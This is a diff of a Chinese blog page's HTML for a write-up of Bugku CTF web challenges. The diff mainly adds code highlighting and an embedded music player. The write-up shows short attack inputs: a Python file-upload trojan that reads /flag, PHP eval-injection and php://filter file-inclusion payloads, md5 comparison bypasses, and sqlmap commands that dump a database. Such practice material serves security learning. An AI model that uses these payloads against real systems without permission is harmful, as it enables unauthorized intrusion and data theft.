@@ -10,14 +10,16 @@
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
     <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg">
     <meta name="360-site-verification" content="2db45fc772bbd3e7efd0985eec0fff97">
-    <meta name="description" content="WEBFlask_FileUpload这是关于py的文件上传
+    <meta name="description" content="
+
+WEBFlask_FileUpload这是关于py的文件上传
 图片马:
 import os
 os.system(&amp;#39;cat /flag&amp;#39;)web1f12里面
 web2前端限制了输入的位数
 修改即可
 web3题目：
-$what=">
+$wha">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -877,7 +879,7 @@ $what=">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.3k
+                        1.2k
                     </div>
                     
 
@@ -901,7 +903,9 @@ $what=">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>这是关于py的文件上传</p>
+                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=569213220&auto=1&height=66"></iframe>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>这是关于py的文件上传</p>
 <p>图片马:</p>
 <pre><code>import os
 os.system(&#39;cat /flag&#39;)</code></pre><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>f12里面</p>
@@ -928,26 +932,29 @@ echo &#39;flag{**********}&#39;;
 <pre><code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#49;&amp;#53;&amp;#102;&amp;#52;&amp;#101;&amp;#98;&amp;#48;&amp;#97;&amp;#102;&amp;#97;&amp;#51;&amp;#99;&amp;#101;&amp;#97;&amp;#54;&amp;#101;&amp;#50;&amp;#99;&amp;#51;&amp;#100;&amp;#48;&amp;#52;&amp;#50;&amp;#97;&amp;#50;&amp;#49;&amp;#100;&amp;#56;&amp;#50;&amp;#48;&amp;#52;&amp;#56;&amp;#125;</code></pre><p>Unicode转ascii得到flag</p>
 <h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>hints：你必须让他停下</p>
 <p>抓一个包即可，发送到repeater不断重放，一帧一帧的分析</p>
-<h2 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h2><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre><code> &lt;?php
- include &quot;flag.php&quot;;
- $a = @$_REQUEST[&#39;hello&#39;];   
- eval( &quot;var_dump($a);&quot;); 
- show_source(__FILE__);
- ?&gt; </code></pre><p>payload：</p>
+<h2 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h2><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+ <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+ <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   
+ <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+ <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>payload：</p>
 <pre><code>?hello=);show_source(&#39;flag.php&#39;</code></pre><p><a href="https://www.runoob.com/php/func-misc-show-source.html" target="_blank" rel="noopener">PHP show_source() 函数</a></p>
-<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><pre><code>flag In the variable ! &lt;?php  
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><pre class="line-numbers language-php"><code class="language-php">flag In the variable <span class="token operator">!</span> 
+<span class="token delimiter">&lt;?php</span>  
 
-error_reporting(0);
-include &quot;flag1.php&quot;;
-highlight_file(__file__);
-if(isset($_GET[&#39;args&#39;])){
-    $args = $_GET[&#39;args&#39;];
-    if(!preg_match(&quot;/^\w+$/&quot;,$args)){
-        die(&quot;args error!&quot;);
-    }
-    eval(&quot;var_dump($$args);&quot;);
-}
-?&gt; </code></pre><p>输入的参数中必须有字母或者数字或者_+$</p>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token string">"flag1.php"</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$args);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输入的参数中必须有字母或者数字或者_+$</p>
 <p>payload：</p>
 <pre><code>?args=GLOBALS</code></pre><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>hints:头等舱</p>
 <p><a href="https://www.cnblogs.com/wangshuazi/p/9809756.html" target="_blank" rel="noopener">header头中有信息</a>：抓包看头信息即可</p>
@@ -959,28 +966,31 @@ if(isset($_GET[&#39;args&#39;])){
 <p>账户admin密码test123在源代码的注释里面有base64解码即可</p>
 <h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>hint：看看源代码？</p>
 <p>源代码：</p>
-<pre><code>&lt;script&gt;
-var p1 = &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;
-var p2 = &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;
-eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));
-&lt;/script&gt;</code></pre><p>url解码得到：</p>
-<pre><code>p1=
-function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b
-p2=
-aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;
-eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));</code></pre><p><a href="https://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() 函数</a></p>
-<pre><code>结合：
-function checkSubmit()
-{
-var a=document.getElementById(&quot;password&quot;);
-if(&quot;undefined&quot;!=typeof a){
-if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;
-alert(&quot;Error&quot;);
-a.focus();
-return!1
-    }
-}
-document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</code></pre><p>将得到的67d709b2b54aa2aa648cf6e87a7114f1提交</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+<span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span><span class="token punctuation">;</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'%35%34%61%61%32'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>url解码得到：</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript">p1<span class="token operator">=</span>
+<span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>"67d709b2b
+p2<span class="token operator">=</span>
+aa648cf6e87a7114f1<span class="token string">"==a.value)return!0;alert("</span>Error<span class="token string">");a.focus();return!1}}document.getElementById("</span>levelQuest"<span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'54aa2'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a href="https://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() 函数</a></p>
+<pre class="line-numbers language-javascript"><code class="language-javascript">结合：
+<span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+<span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"67d709b2b54aa2aa648cf6e87a7114f1"</span><span class="token operator">==</span>a<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+a<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token operator">!</span><span class="token number">1</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"levelQuest"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将得到的67d709b2b54aa2aa648cf6e87a7114f1提交</p>
 <p>得到flag</p>
 <h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>文件包含常用漏洞，</p>
 <pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>hints:   好像需要密码</p>
@@ -990,20 +1000,21 @@ document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</code></pr
 <p>得到一个字符串：d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e</p>
 <p>md5解密：[空密码]</p>
 <p>直接上我的备份小字典，结合burp实现半自动化爆破的得到文件：index.php.bak</p>
-<pre><code>&lt;?php
-include_once &quot;flag.php&quot;;
-ini_set(&quot;display_errors&quot;, 0);
-$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);
-$str = substr($str,1);
-$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);
-parse_str($str);
-echo md5($key1);
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-echo md5($key2);
-if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
-    echo $flag.&quot;取得flag&quot;;
-}
-?&gt;</code></pre><p>考点md5碰撞：?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</p>
+<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"取得flag"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>考点md5碰撞：?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</p>
 <p>或者md5()函数不处理数组：?kekeyy1[]=[1]&amp;kekeyy2[]=[2]</p>
 <h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>直接手工注入！！！！！！！结果老是失败</p>
 <p>只能SQLmap了，建议先burp抓包用-r a.txt来实现sqlmap</p>
@@ -1011,26 +1022,28 @@ if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
 <pre><code>sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; --dbs
 sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf --tables
 sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g --columns
-sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump</code></pre><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><pre><code>import requests
-import re
-url = &#39;http://114.67.246.176:17079/&#39;
-s = requests.Session()
-source = s.get(url)
-expression = re.search(r&#39;(\d+[+\-*])+(\d+)&#39;,source.text).group()
-result = eval(expression)
-post = {&#39;value&#39;:result}
-print(s.post(url,data=post).text)</code></pre><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><pre><code>import requests
-import base64
-import re #正则匹配模块
-s = requests.session() #建立会话
-url = &quot;http://123.206.87.240:8002/web6/&quot;
-head = s.get(url).headers #获取头部信息
-result = head[&#39;flag&#39;] #得到flag的value
-result = base64.b64decode(result).decode(&#39;utf-8&#39;) #第一次base64解码
-result = re.search(&#39;\w+$&#39;, result).group(0) #正则匹配base64编码的flag
-result = base64.b64decode(result).decode(&#39;utf-8&#39;) #第二次解码
-payload = {&#39;margin&#39;: result}
-print(s.post(url, data=payload).text) #post传输数据且输出返回信息</code></pre><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2>
+sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump</code></pre><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+url <span class="token operator">=</span> <span class="token string">'http://114.67.246.176:17079/'</span>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+source <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+\-*])+(\d+)'</span><span class="token punctuation">,</span>source<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
+result <span class="token operator">=</span> eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span>
+post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span>result<span class="token punctuation">}</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> re <span class="token comment" spellcheck="true">#正则匹配模块</span>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#建立会话</span>
+url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web6/"</span>
+head <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers <span class="token comment" spellcheck="true">#获取头部信息</span>
+result <span class="token operator">=</span> head<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#得到flag的value</span>
+result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第一次base64解码</span>
+result <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'\w+$'</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#正则匹配base64编码的flag</span>
+result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第二次解码</span>
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'margin'</span><span class="token punctuation">:</span> result<span class="token punctuation">}</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#post传输数据且输出返回信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2>
             </div>
             <hr/>
 
@@ -1424,9 +1437,11 @@ print(s.post(url, data=payload).text) #post传输数据且输出返回信息</co
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            AWD初步要求起因：4-24晚参加bugku的awd跌倒，凸显出的问题很多，故此开始爬起
+                            
+
+AWD初步要求起因：4-24晚参加bugku的awd跌倒，凸显出的问题很多，故此开始爬起
 1.运用ssh命令连接靶机：在kali中的命令：
-ssh team32@192-168-1-255.bugku.awd.cn -p 2222这里的ss
+ssh team32@192-168-1-255.bugku.awd.cn -p 2222这里的
                         
                     </div>
                     <div class="publish-info">
@@ -1751,7 +1766,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">79.2k</span> 字
+                <span class="white-color">79.7k</span> 字
             
 
             
